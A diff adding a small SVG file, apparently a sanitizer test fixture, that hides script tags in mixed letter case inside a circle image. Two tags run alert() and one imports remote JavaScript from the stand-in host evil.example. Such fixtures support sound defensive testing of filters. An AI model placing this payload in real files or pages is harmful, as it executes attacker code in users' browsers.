@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
+  <SCRIPT>alert(1)</SCRIPT>
+  <Script>alert(2)</Script>
+  <sCrIpT type="module">import("https://evil.example/m.js")</sCrIpT>
+  <circle cx="50" cy="50" r="40"/>
+</svg>
